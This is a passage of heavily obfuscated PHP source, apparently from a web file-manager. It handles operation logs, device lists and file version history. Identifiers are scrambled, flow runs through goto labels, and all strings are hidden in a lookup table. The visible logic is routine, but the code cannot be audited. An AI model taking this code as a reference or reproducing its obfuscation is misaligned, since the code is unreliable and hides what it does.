array($AÜ ³¥â, $Fğµ¦äµëƒ)); } if ($CãˆŒõ“†[$F­ÎÖ¿½¦[29]]) { $Eßë§ÃóŒÍ = explode($F­ÎÖ¿½¦[47], $CãˆŒõ“†[$F­ÎÖ¿½¦[29]]); $e­¤‘èô¢ë = $this->typeFile(); $D†ã‰º´Á§ = array(); foreach ($Eßë§ÃóŒÍ as $Fˆƒøê¶») { $D†ã‰º´Á§[] = $Fˆƒøê¶»; if (isset($e­¤‘èô¢ë[$Fˆƒøê¶»])) { $D†ã‰º´Á§ = array_merge($D†ã‰º´Á§, $e­¤‘èô¢ë[$Fˆƒøê¶»]); } } $D†ã‰º´Á§ = array_unique($D†ã‰º´Á§); if ($D†ã‰º´Á§) { $fÂÏ‚²â…¶[$F­ÎÖ¿½¦[29]] = array($F­ÎÖ¿½¦[7], $D†ã‰º´Á§); } } goto B Âââ´İä; B Âââ´İä: if (!empty($CãˆŒõ“†[$F­ÎÖ¿½¦[2047]])) { $fÂÏ‚²â…¶[$F­ÎÖ¿½¦[434]] = array($F­ÎÖ¿½¦[387], "\x25{$CãˆŒõ“†[$F­ÎÖ¿½¦[2047]]}\45"); } $C°—Êßƒ¾‡ = $this->_makeOrder()->where($fÂÏ‚²â…¶)->selectPage(); if (empty($C°—Êßƒ¾‡[$F­ÎÖ¿½¦[375]])) { show_json(array(), !0, $C°—Êßƒ¾‡[$F­ÎÖ¿½¦[372]]); } goto eß¢è²«¾‡; Eß¸²Í™”¢: } private function ipAddress(&$e»àªè£Ğ×) { $cÌ½¸ø–¹ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!empty($e»àªè£Ğ×[$cÌ½¸ø–¹ù[2047]])) { $dÛ“–ò§ÚÈ = IpLocation::get($e»àªè£Ğ×[$cÌ½¸ø–¹ù[2047]]); } else { $dÛ“–ò§ÚÈ = LNG($cÌ½¸ø–¹ù[2048]); } $e»àªè£Ğ×[$cÌ½¸ø–¹ù[2049]] = $dÛ“–ò§ÚÈ; } private function descZipDownload($EÏç¨ÜÜ´ , &$BºÉ·ùÜ©É) { $EÈ„ôëÏ© =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($EÏç¨ÜÜ´ [$EÈ„ôëÏ©[2050]])) { return; } $dÍâãå»É¥ = json_decode($EÏç¨ÜÜ´ [$EÈ„ôëÏ©[2050]], !0); foreach ($dÍâãå»É¥ as $E¦³‹ÓäøÇ) { try { $F¢³Ù‡‰å‘ = IO::infoFull($E¦³‹ÓäøÇ[$EÈ„ôëÏ©[85]]); } catch (Exception $Fã‡êñ¢ŠÎ) { continue; } $EÏç¨ÜÜ´ [$EÈ„ôëÏ©[85]] = $E¦³‹ÓäøÇ[$EÈ„ôëÏ©[85]]; $BºÉ·ùÜ©É[] = $EÏç¨ÜÜ´ [$EÈ„ôëÏ©[399]] = $F¢³Ù‡‰å‘[$EÈ„ôëÏ©[399]]; $BºÉ·ùÜ©É[] = $EÏç¨ÜÜ´ [$EÈ„ôëÏ©[1865]] = $F¢³Ù‡‰å‘[$EÈ„ôëÏ©[481]]; break; } return $EÏç¨ÜÜ´ ; } private function getSourceList(&$Fé‡ßŒ‡¥¤) { $d®™¤¾÷Ù³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eì¡Å¦³ÊÑ = array(); foreach ($Fé‡ßŒ‡¥¤ as $dç¦×Œ› => $FŞ¨¾İªœ) { goto CƒÈñˆ…¦; f²¿‘´½½ğ: if ($aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[29]] == $d®™¤¾÷Ù³[1873]) { $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[434]][$d®™¤¾÷Ù³[399]]; } goto b¯õ²ŒŒ†ñ; CƒÈñˆ…¦: $aËÂ‡Ö×¢™ = json_decode($FŞ¨¾İªœ[$d®™¤¾÷Ù³[434]], !0); if ($FŞ¨¾İªœ[$d®™¤¾÷Ù³[29]] == $d®™¤¾÷Ù³[1621]) { $aËÂ‡Ö×¢™ = $this->descZipDownload($aËÂ‡Ö×¢™, $Eì¡Å¦³ÊÑ); $Fé‡ßŒ‡¥¤[$dç¦×Œ›][$d®™¤¾÷Ù³[434]] = json_encode($aËÂ‡Ö×¢™); continue; } if (strpos($FŞ¨¾İªœ[$d®™¤¾÷Ù³[29]], $d®™¤¾÷Ù³[1866]) !== 0) { if (!isset($aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[85]]) || strpos($FŞ¨¾İªœ[$d®™¤¾÷Ù³[29]], $d®™¤¾÷Ù³[2051]) !== 0) { continue; } try { $Eö©çĞ³æã = IO::infoFull($aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[85]]); } catch (Exception $dÆÜñ³) { continue; } $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[399]] = $Eö©çĞ³æã[$d®™¤¾÷Ù³[399]]; $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[1865]] = $Eö©çĞ³æã[$d®™¤¾÷Ù³[481]]; $Fé‡ßŒ‡¥¤[$dç¦×Œ›][$d®™¤¾÷Ù³[434]] = json_encode($aËÂ‡Ö×¢™); continue; } goto aÄ›ŒôÀâ; aÄ›ŒôÀâ: $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[399]]; $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[1865]]; if ($aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[29]] == $d®™¤¾÷Ù³[524]) { $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[434]][$d®™¤¾÷Ù³[1015]]; $Eì¡Å¦³ÊÑ[] = $aËÂ‡Ö×¢™[$d®™¤¾÷Ù³[434]][$d®™¤¾÷Ù³[1016]]; } goto f²¿‘´½½ğ; b¯õ²ŒŒ†ñ: } if (!$Eì¡Å¦³ÊÑ) { return array(); } return Model($d®™¤¾÷Ù³[759])->sourceListInfo($Eì¡Å¦³ÊÑ, !0); } private function logList($D©áõÀÁˆ) { goto Fá£ÎÙˆˆ; dÆéƒœìŸ„: $Bãå†·ˆùç = array(); foreach ($D©áõÀÁˆ as $E¿Ù„¼„ => $Fõ‰Ã¦•À) { goto AŠÎƒ¨Ê‡‡; AŠÎƒ¨Ê‡‡: $eÇ¯ˆ•âŞª = $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[29]]; $E’Á†ñôº = isset($e‚İ†°¾ø[$Fõ‰Ã¦•À[$F¢®‹Œ¨ª[1487]]]) ? $e‚İ†°¾ø[$Fõ‰Ã¦•À[$F¢®‹Œ¨ª[1487]]] : !1; $c”òº¡¤Í¾ = strpos($eÇ¯ˆ•âŞª, $F¢®‹Œ¨ª[2052]) === 0 ? LNG($F¢®‹Œ¨ª[2053]) : LNG($F¢®‹Œ¨ª[2048]); goto DÀ—§…ŒÆï; Bì·ÊŠ°: $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[1808]] = $E’Á†ñôº; $Dù÷ºÍªñ = json_decode($Fõ‰Ã¦•À[$F¢®‹Œ¨ª[434]], !0); $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[2047]] = isset($Dù÷ºÍªñ[$F¢®‹Œ¨ª[2047]]) ? $Dù÷ºÍªñ[$F¢®‹Œ¨ª[2047]] : $F¢®‹Œ¨ª[33]; goto DíùçÕ²¾•; DíùçÕ²¾•: $this->ipAddress($Fõ‰Ã¦•À); if (strpos($eÇ¯ˆ•âŞª, $F¢®‹Œ¨ª[1866]) === 0 || isset($Dù÷ºÍªñ[$F¢®‹Œ¨ª[1865]])) { goto cèÉáœäÄ˜; E‚…¬äìæî: if ($Dù÷ºÍªñ[$F¢®‹Œ¨ª[1878]] && $Dù÷ºÍªñ[$F¢®‹Œ¨ª[1878]][$F¢®‹Œ¨ª[407]] == $F¢®‹Œ¨ª[1129]) { $Bãå†·ˆùç[] = $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[397]]; unset($D©áõÀÁˆ[$E¿Ù„¼„]); continue; } goto fœÚ¿Ô‡‘Ú; Aå…Œ”ÁÎç: if ($Dù÷ºÍªñ[$F¢®‹Œ¨ª[29]] == $F¢®‹Œ¨ª[1873]) { $Dù÷ºÍªñ[$F¢®‹Œ¨ª[434]][$F¢®‹Œ¨ª[399]] = $DØ’ê–ª[$Dù÷ºÍªñ[$F¢®‹Œ¨ª[434]][$F¢®‹Œ¨ª[399]]]; } if ($Dù÷ºÍªñ[$F¢®‹Œ¨ª[29]] == $F¢®‹Œ¨ª[1616]) { $Dù÷ºÍªñ[$F¢®‹Œ¨ª[1878]] = $Dù÷ºÍªñ[$F¢®‹Œ¨ª[94]]; $Dù÷ºÍªñ[$F¢®‹Œ¨ª[1865]] = $Dù÷ºÍªñ[$F¢®‹Œ¨ª[1878]][$F¢®‹Œ¨ª[399]]; $Dù÷ºÍªñ[$F¢®‹Œ¨ª[94]] = !1; $Dù÷ºÍªñ[$F¢®‹Œ¨ª[399]] = $F¢®‹Œ¨ª[33]; } if ($Dù÷ºÍªñ[$F¢®‹Œ¨ª[94]] && $Dù÷ºÍªñ[$F¢®‹Œ¨ª[94]][$F¢®‹Œ¨ª[407]] == $F¢®‹Œ¨ª[1129]) { $Bãå†·ˆùç[] = $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[397]]; unset($D©áõÀÁˆ[$E¿Ù„¼„]); continue; } goto E‚…¬äìæî; cèÉáœäÄ˜: $Dù÷ºÍªñ[$F¢®‹Œ¨ª[94]] = $DØ’ê–ª[$Dù÷ºÍªñ[$F¢®‹Œ¨ª[399]]]; $Dù÷ºÍªñ[$F¢®‹Œ¨ª[1878]] = $DØ’ê–ª[$Dù÷ºÍªñ[$F¢®‹Œ¨ª[1865]]]; if ($Dù÷ºÍªñ[$F¢®‹Œ¨ª[29]] == $F¢®‹Œ¨ª[524]) { $Dù÷ºÍªñ[$F¢®‹Œ¨ª[434]][$F¢®‹Œ¨ª[1015]] = $DØ’ê–ª[$Dù÷ºÍªñ[$F¢®‹Œ¨ª[434]][$F¢®‹Œ¨ª[1015]]]; $Dù÷ºÍªñ[$F¢®‹Œ¨ª[434]][$F¢®‹Œ¨ª[1016]] = $DØ’ê–ª[$Dù÷ºÍªñ[$F¢®‹Œ¨ª[434]][$F¢®‹Œ¨ª[1016]]]; } goto Aå…Œ”ÁÎç; fœÚ¿Ô‡‘Ú: } $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[434]] = $Dù÷ºÍªñ; goto b¦¦§“å­; b¦¦§“å­: unset($Fõ‰Ã¦•À[$F¢®‹Œ¨ª[2054]]); $B¸îğø´à[] = $Fõ‰Ã¦•À; goto D¨Ã½ôŠ; DÀ—§…ŒÆï: $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[28]] = isset($E’Á†ñôº[$F¢®‹Œ¨ª[28]]) ? $E’Á†ñôº[$F¢®‹Œ¨ª[28]] : LNG($F¢®‹Œ¨ª[2048]); $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[1915]] = isset($E’Á†ñôº[$F¢®‹Œ¨ª[1915]]) ? $E’Á†ñôº[$F¢®‹Œ¨ª[1915]] : $F¢®‹Œ¨ª[33]; $Fõ‰Ã¦•À[$F¢®‹Œ¨ª[1393]] = isset($A‘¹³ïßöª[$eÇ¯ˆ•âŞª]) ? $A‘¹³ïßöª[$eÇ¯ˆ•âŞª] : $c”òº¡¤Í¾; goto Bì·ÊŠ°; D¨Ã½ôŠ: } $this->clearSystemPathLog($Bãå†·ˆùç); goto C°©ÈõïİÊ; Fá£ÎÙˆˆ: $F¢®‹Œ¨ª =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f„‹‰…ƒÚâ = array_to_keyvalue($D©áõÀÁˆ, $F¢®‹Œ¨ª[33], $F¢®‹Œ¨ª[1487]); $e‚İ†°¾ø = Model($F¢®‹Œ¨ª[510])->userListInfo(array_unique($f„‹‰…ƒÚâ)); goto eì‚ç±á¸À; eì‚ç±á¸À: $DØ’ê–ª = $this->getSourceList($D©áõÀÁˆ); $A‘¹³ïßöª = $this->typeAll(); $B¸îğø´à = array(); goto dÆéƒœìŸ„; C°©ÈõïİÊ: return $B¸îğø´à; goto A•©£ÄÅÔá; A•©£ÄÅÔá: } private function clearSystemPathLog($C¿ï—¢§÷) { $c´ÖÃâ­øš =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (count($C¿ï—¢§÷) == 0) { return; } $aÖí•˜‡œ = array($c´ÖÃâ­øš[397] => array($c´ÖÃâ­øš[7], array_unique($C¿ï—¢§÷))); $this->where($aÖí•˜‡œ)->delete(); } public function deviceList($d†­‰”ïÆÎ, $C¸æö¦ÄøÓ = 0) { $FÑ„ İÉÖ² =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d©Œ¼„Í÷ = array($FÑ„ İÉÖ²[1487] => $d†­‰”ïÆÎ, $FÑ„ İÉÖ²[202] => array($FÑ„ İÉÖ²[932], $C¸æö¦ÄøÓ), $FÑ„ İÉÖ²[29] => $FÑ„ İÉÖ²[1590]); $FÓ‹ğ˜Ãèô = array(); $DéÑÙ‰¯òÄ = $this->field($FÑ„ İÉÖ²[2055])->where($d©Œ¼„Í÷)->order($FÑ„ İÉÖ²[1876])->limit(50)->select(); foreach ($DéÑÙ‰¯òÄ as $DÊàŠ‘„Î¢ => $BÂ¿Ó³Î‘˜) { goto C£¬¬âí™Ç; EØáäÙÅÙ§: unset($DÕõ·†œ‹¹[$FÑ„ İÉÖ²[2047]]); $a×ÀÚ¾ğ = $this->deviceType($DÕõ·†œ‹¹[$FÑ„ İÉÖ²[1867]]); if (isset($FÓ‹ğ˜Ãèô[$a×ÀÚ¾ğ])) { continue; } goto aõÕµ¨§Î¨; C£¬¬âí™Ç: if ($DÊàŠ‘„Î¢ > 0 && abs($BÂ¿Ó³Î‘˜[$FÑ„ İÉÖ²[202]] - $DéÑÙ‰¯òÄ[$DÊàŠ‘„Î¢ - 1][$FÑ„ İÉÖ²[202]]) < 5) { continue; } $DÕõ·†œ‹¹ = json_decode($BÂ¿Ó³Î‘˜[$FÑ„ İÉÖ²[434]], !0); $BÂ¿Ó³Î‘˜[$FÑ„ İÉÖ²[2047]] = isset($DÕõ·†œ‹¹[$FÑ„ İÉÖ²[2047]]) ? $DÕõ·†œ‹¹[$FÑ„ İÉÖ²[2047]] : $FÑ„ İÉÖ²[33]; goto EØáäÙÅÙ§; aõÕµ¨§Î¨: $this->ipAddress($BÂ¿Ó³Î‘˜); $BÂ¿Ó³Î‘˜[$FÑ„ İÉÖ²[434]] = $DÕõ·†œ‹¹; $FÓ‹ğ˜Ãèô[$a×ÀÚ¾ğ] = $BÂ¿Ó³Î‘˜; goto D°ãŒ²ç”ğ; D°ãŒ²ç”ğ: } return array_values($FÓ‹ğ˜Ãèô); } public function deviceType($AŠ„“î¹) { return $AŠ„“î¹; } } goto Eåï¼¾£ç; e˜º³Ò…Õ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto dÃˆŠÔ˜½‹; dÃˆŠÔ˜½‹: $F¬¨¯é¦áº =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CíÖÒ¬³ôì = $GLOBALS[$F¬¨¯é¦áº[6]][$F¬¨¯é¦áº[97]][$F¬¨¯é¦áº[1063]]; if ($CíÖÒ¬³ôì <= 0) { return; } goto d˜æ¤İ¬; c³Œì¯Ö§ğ: Hook::bind($F¬¨¯é¦áº[1069], $F¬¨¯é¦áº[1070]); Hook::bind($F¬¨¯é¦áº[1071], $F¬¨¯é¦áº[1072]); Hook::bind($F¬¨¯é¦áº[1073], $F¬¨¯é¦áº[1074]); goto EšÖ¶¾•; EšÖ¶¾•: Hook::bind($F¬¨¯é¦áº[1075], $F¬¨¯é¦áº[1076]); goto a«„ä›ëÒ; d˜æ¤İ¬: if (isset($_REQUEST[$F¬¨¯é¦áº[1064]]) && $_REQUEST[$F¬¨¯é¦áº[1064]] == $F¬¨¯é¦áº[96]) { return; } Hook::bind($F¬¨¯é¦áº[1065], $F¬¨¯é¦áº[1066]); Hook::bind($F¬¨¯é¦áº[1067], $F¬¨¯é¦áº[1068]); goto c³Œì¯Ö§ğ; a«„ä›ëÒ: } public static function eventBeforeUpload($aÂæ£™Àî) { if ($aÂæ£™Àî[3] && $aÂæ£™Àî[3] != REPEAT_REPLACE) { return; } $CàùŞ…ïŞÍ = self::parsePath($aÂæ£™Àî[0]); if (!$CàùŞ…ïŞÍ) { return; } self::add($CàùŞ…ïŞÍ); } public static function eventBeforeEdit($aâ»ŠŠ‚ƒ») { $AŒ„–è¤Ÿ = self::parsePath($aâ»ŠŠ‚ƒ»[0]); if (!$AŒ„–è¤Ÿ) { return; } self::add($AŒ„–è¤Ÿ); } public static function eventBeforeCopyFile($aÁĞİ“ñ§½, $Fºˆ»ò½, $FÛ‘Ë Šˆ, $aÃÚ¶ïÍÂ§, $cŞ‹‘ï¦È, $f¥øÆï‹Í¡) { $bï¼Û§Í‡ï = $FÛ‘Ë Šˆ->getPathOuter($aÃÚ¶ïÍÂ§); $A–İŸ‚ÏŒÃ = self::parsePath($bï¼Û§Í‡ï); if (!$A–İŸ‚ÏŒÃ) { return; } self::add($A–İŸ‚ÏŒÃ); } public static function eventBeforeRename($aµˆó˜ë»´) { $D¡Çó»á— =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÊÍ¸ƒô×Ú = self::parsePath($aµˆó˜ë»´[0]); if (!$AÊÍ¸ƒô×Ú) { return; } $Eô°šä‡‡è = self::checkInHistory($AÊÍ¸ƒô×Ú); if (!$Eô°šä‡‡è) { return; } if ($Eô°šä‡‡è[$D¡Çó»á—[29]] == $D¡Çó»á—[201]) { $BíÊõ¹½ô = self::listData($AÊÍ¸ƒô×Ú); if ($BíÊõ¹½ô && $BíÊõ¹½ô[$D¡Çó»á—[375]]) { self::moveHistory($AÊÍ¸ƒô×Ú, $aµˆó˜ë»´[1]); } } else { IO::rename($Eô°šä‡‡è[$D¡Çó»á—[85]], $aµˆó˜ë»´[1]); } } public static function eventBeforeMove($bğÛ‹³óò) { goto A²òß¡½¿; cáêºçîµ: if ($EİÁ—ÓÆ­é[$d‹î¬ÒÖ[29]] == $d‹î¬ÒÖ[201]) { $a²ˆíˆôù¼ = self::listData($D…Õ“ç£ã—); $F’¬¹±Â™É = rtrim($b÷Ê£ç‹í÷, $d‹î¬ÒÖ[8]) . $d‹î¬ÒÖ[8] . ($BĞ»áˆ†¹õ ? $BĞ»áˆ†¹õ : get_path_this($D…Õ“ç£ã—)); $e¼Àë³Ü×Ç = self::listData($F’¬¹±Â™É); if ($a²ˆíˆôù¼ && $a²ˆíˆôù¼[$d‹î¬ÒÖ[375]] && $e¼Àë³Ü×Ç && $e¼Àë³Ü×Ç[$d‹î¬ÒÖ[375]]) { return self::clear($D…Õ“ç£ã—); } if ($a²ˆíˆôù¼ && $a²ˆíˆôù¼[$d‹î¬ÒÖ[375]]) { self::moveHistory($D…Õ“ç£ã—, $BĞ»áˆ†¹õ, $A¤ìĞŞ©Š¥); } } else { IO::move($EİÁ—ÓÆ­é[$d‹î¬ÒÖ[85]], $A¤ìĞŞ©Š¥, !1, $BĞ»áˆ†¹õ); self::clearEmptyFolder(IO::pathFather($EİÁ—ÓÆ­é[$d‹î¬ÒÖ[85]])); } goto B±´Ó½ã—ˆ; AøŒ•àŒ: $b÷Ê£ç‹í÷ = self::parsePath($bğÛ‹³óò[1]); if (!$b÷Ê£ç‹í÷) { return; } $BĞ»áˆ†¹õ = $bğÛ‹³óò[3]; goto AåĞùÖ¬Î; AåĞùÖ¬Î: $EİÁ—ÓÆ­é = self::checkInHistory($D…Õ“ç£ã—); if (!$EİÁ—ÓÆ­é) { return; } $A¤ìĞŞ©Š¥ = self::pathHistory($b÷Ê£ç‹í÷); goto cáêºçîµ; A²òß¡½¿: $d‹î¬ÒÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D…Õ“ç£ã— = self::parsePath($bğÛ‹³óò[0]); if (!$D…Õ“ç£ã—) { return; } goto AøŒ•àŒ; B±´Ó½ã—ˆ: } public static function eventAfterRemove($F·›ÖËÈÖË, $EôËóïÃè) { goto Dˆìİäàö; F…Š¹Ç¢Ğó: if (!$Dö“Òñ»ê¥) { return; } $AËô»²î«¶ = self::checkInHistory($Dö“Òñ»ê¥); if (!$AËô»²î«¶) { return; } goto cƒŠïåí‹Ò; cƒŠïåí‹Ò: if ($AËô»²î«¶[$FßŠ¢•½ ¹[29]] == $FßŠ¢•½ ¹[201]) { $FÑ˜›™Åà» = self::listData($Dö“Òñ»ê¥, !1); if ($FÑ˜›™Åà» && $FÑ˜›™Åà»[$FßŠ¢•½ ¹[375]]) { self::clear($Dö“Òñ»ê¥, !1); } } else { IO::remove($AËô»²î«¶[$FßŠ¢•½ ¹[85]]); self::clearEmptyFolder(IO::pathFather($AËô»²î«¶[$FßŠ¢•½ ¹[85]])); } goto f‹ŠİÓîòˆ; Dˆìİäàö: $FßŠ¢•½ ¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$EôËóïÃè) { return; } $Dö“Òñ»ê¥ = self::parsePath($F·›ÖËÈÖË[0]); goto F…Š¹Ç¢Ğó; f‹ŠİÓîòˆ: } private static function checkInHistory($a¡â­ÈÊÇ™) { $B´ÙĞ¯Èé = self::pathHistory($a¡â­ÈÊÇ™); if (!IO::exist($B´ÙĞ¯Èé)) { $B´ÙĞ¯Èé .= $_SERVER[í¤âËÚ£¶íÊ¢][1077]; } return IO::exist($B´ÙĞ¯Èé) ? IO::info($B´ÙĞ¯Èé) : !1; } private static function parsePath($c«°İ£äç) { goto C¦“Œ²ŠÏ; Cøøá¾«Ïˆ: $FìŸ¶„Œô™ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $f„Ë—‰Ìİ˜[1080]); foreach ($FìŸ¶„Œô™ as $d¡¨øì‰Î) { if (!$AÇù”ùŸ™´ && substr($c«°İ£äç, 0, strlen($d¡¨øì‰Î)) == $d¡¨øì‰Î) { return !1; } } self::log($GLOBALS[$f„Ë—‰Ìİ˜[1003]] . $f„Ë—‰Ìİ˜[1081] . $c«°İ£äç); goto d…ĞÀÌ¹©Ñ; dÉì»“ãØ®: if (!$A«‡îÊÔ˜´ || !$cÁÏ†…[$f„Ë—‰Ìİ˜[1079]]) { return !1; } if ($AÇù”ùŸ™´ == KodIO::KOD_SHARE_ITEM) { $e£×Ùâİ¼Ê = IO::init($c«°İ£äç); if ($e£×Ùâİ¼Ê->pathParse[$f„Ë—‰Ìİ˜[1008]]) { return self::parsePath($e£×Ùâİ¼Ê->pathParse[$f„Ë—‰Ìİ˜[1008]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Cøøá¾«Ïˆ; d…ĞÀÌ¹©Ñ: return $c«°İ£äç; goto cµ®ªˆöå…; C¦“Œ²ŠÏ: $f„Ë—‰Ìİ˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$c«°İ£äç) { return !1; } if ($GLOBALS[$f„Ë—‰Ìİ˜[1078]]) { return; } goto EÃëÇÕ£«º; EÃëÇÕ£«º: $cÁÏ†… = KodIO::parse($c«°İ£äç); $AÇù”ùŸ™´ = $cÁÏ†…[$f„Ë—‰Ìİ˜[29]]; $A«‡îÊÔ˜´ = !$AÇù”ùŸ™´ || $AÇù”ùŸ™´ == KodIO::KOD_IO || $AÇù”ùŸ™´ == KodIO::KOD_SHARE_ITEM; goto dÉì»“ãØ®; cµ®ªˆöå…: } private static function pathHistory($EÑò¦ø¹©) { $F“×ƒšŞ¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¾ôİÒ¡— = self::$_historyBase . ltrim(KodIO::clear($EÑò¦ø¹©), $F“×ƒšŞ¦[8]); $e¾ôİÒ¡— = str_replace(array($F“×ƒšŞ¦[1082]), array($F“×ƒšŞ¦[1083]), $e¾ôİÒ¡—); return $e¾ôİÒ¡—; } public static function log($bô‹èÀ–Ùã) { } public static function historyCount($bÉ½“õÉå) { $F…÷Õäµ’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fã§îÉ–é = array(); $Eˆ¥ò•±ğ¼ = array(); foreach ($bÉ½“õÉå as $aÂµŠ» ­Â) { $Fó¢­ öéÇ = get_path_father($aÂµŠ» ­Â); if (!$Eˆ¥ò•±ğ¼[$Fó¢­ öéÇ]) { $Eˆ¥ò•±ğ¼[$Fó¢­ öéÇ] = array(); } $Eˆ¥ò•±ğ¼[$Fó¢­ öéÇ][] = get_path_this($aÂµŠ» ­Â); } foreach ($Eˆ¥ò•±ğ¼ as $Fó¢­ öéÇ => $cÆÉâ„«–Ü) { $A®†åŒ‚èÆ = self::parsePath($Fó¢­ öéÇ); if (!$A®†åŒ‚èÆ) { continue; } foreach ($cÆÉâ„«–Ü as $FİƒÖ½‡Ö) { $C¡Şµğ = self::listData(rtrim($A®†åŒ‚èÆ, $F…÷Õäµ’[8]) . $F…÷Õäµ’[8] . $FİƒÖ½‡Ö, !1); if ($C¡Şµğ && $C¡Şµğ[$F…÷Õäµ’[375]]) { $fã§îÉ–é[rtrim($Fó¢­ öéÇ, $F…÷Õäµ’[8]) . $F…÷Õäµ’[8] . $FİƒÖ½‡Ö] = count($C¡Şµğ[$F…÷Õäµ’[375]]); } } } return $fã§îÉ–é; } public static function add($e®ªŞ¼ Àã) { goto f£­È¾×Æ’; aÈ¢Àò÷×: if (!$FÅæªòš) { self::clearEmptyFolder($DÕğğ´Š[$c‰½½—îÉË[1089]]); return !1; } array_unshift($bğ®©™ãº×, $c¯™’¼ÅÓ»); if (count($bğ®©™ãº×) > $DèÜÇ„İ…É) { $fª£Ö®æî± = array_slice($bğ®©™ãº×, $DèÜÇ„İ…É); foreach ($fª£Ö®æî± as $d‘•Ø†”‹) { IO::remove($DÕğğ´Š[$c‰½½—îÉË[1089]] . $d‘•Ø†”‹[$c‰½½—îÉË[28]]); } $bğ®©™ãº× = array_slice($bğ®©™ãº×, 0, $DèÜÇ„İ…É); } goto E¯ÓìÌ¬§; BºŒåå¸±è: if ($bğ®©™ãº× && $bğ®©™ãº×[0][$c‰½½—îÉË[180]] == $C£„ö÷»Á) { return !0; } if (array_key_exists($c‰½½—îÉË[204], $EÈå‚Ò¦­ù) && !$EÈå‚Ò¦­ù[$c‰½½—îÉË[204]]) { return !1; } $F­¶Ó¬¦äÁ = short_id(time()); goto a†Ç¥¦ÎÊ®; f£­È¾×Æ’: $c‰½½—îÉË =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÕğğ´Š = self::listData($e®ªŞ¼ Àã); if (!$DÕğğ´Š) { return; } goto e²ùŞÚË®—; E¯ÓìÌ¬§: return self::saveData($DÕğğ´Š[$c‰½½—îÉË[1090]], $bğ®©™ãº×); goto d¹À³ãÅ¯¶; B×°‚ ñğ: if ($cÚÒ©«¦ñØ <= 0) { return; } $C£„ö÷»Á = IO::hashSimple($e®ªŞ¼ Àã); $EÈå‚Ò¦­ù = IO::info($e®ªŞ¼ Àã); goto A±‡Âö¶¸ª; A±‡Âö¶¸ª: $bğ®©™ãº× = $DÕğğ´Š[$c‰½½—îÉË[375]]; if ($EÈå‚Ò¦­ù[$c‰½½—îÉË[87]] == 0) { return; } if ($EÈå‚Ò¦­ù[$c‰½½—îÉË[87]] >= 1024 * 1024 * 500) { return !1; } goto BºŒåå¸±è; a†Ç¥¦ÎÊ®: $c¯™’¼ÅÓ» = array($c‰½½—îÉË[397] => $F­¶Ó¬¦äÁ, $c‰½½—îÉË[180] => $C£„ö÷»Á, $c‰½½—îÉË[28] => $EÈå‚Ò¦­ù[$c‰½½—îÉË[28]] . $c‰½½—îÉË[104] . date($c‰½½—îÉË[1087]) . rand_string(1), $c‰½½—îÉË[87] => $EÈå‚Ò¦­ù[$c‰½½—îÉË[87]], $c‰½½—îÉË[435] => USER_ID, $c‰½½—îÉË[202] => time(), $c‰½½—îÉË[1088] => $c‰½½—îÉË[33]); IO::mkdir($DÕğğ´Š[$c‰½½—îÉË[1089]]); $FÅæªòš = IO::copy($e®ªŞ¼ Àã, $DÕğğ´Š[$c‰½½—îÉË[1089]], !1, $c¯™’¼ÅÓ»[$c‰½½—îÉË[28]]); goto aÈ¢Àò÷×; e²ùŞÚË®—: $Fàê£õİ’ = Model($c‰½½—îÉË[1084])->get($c‰½½—îÉË[1085]); $cÚÒ©«¦ñØ = $GLOBALS[$c‰½½—îÉË[6]][$c‰½½—îÉË[97]][$c‰½½—îÉË[1063]]; $DèÜÇ„İ…É = $Fàê£õİ’ == $c‰½½—îÉË[1086] ? 5 : $cÚÒ©«¦ñØ; goto B×°‚ ñğ; d¹À³ãÅ¯¶: } public static function remove($eæìÏ´ßŠœ, $A¬ƒ»ÆÇÇ‹) { $fš›ÑÚÄÆ­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A³ØøîÔ§ = self::listData($eæìÏ´ßŠœ); $e©ùÛì Š = array(); if (!$A³ØøîÔ§) { return !1; } foreach ($A³ØøîÔ§[$fš›ÑÚÄÆ­[375]] as $A­“°âŒõº) { if ($A­“°âŒõº[$fš›ÑÚÄÆ­[397]] == $A¬ƒ»ÆÇÇ‹) { IO::remove($A³ØøîÔ§[$fš›ÑÚÄÆ­[1089]] . $A­“°âŒõº[$fš›ÑÚÄÆ­[28]]); continue; } $e©ùÛì Š[] = $A­“°âŒõº; } return self::saveData($A³ØøîÔ§[$fš›ÑÚÄÆ­[1090]], $e©ùÛì Š); } public static function clear($dŠÄ¡…ë–š, $B£õãáòÂ™ = true) { $D³ŠêÂªŠ =& 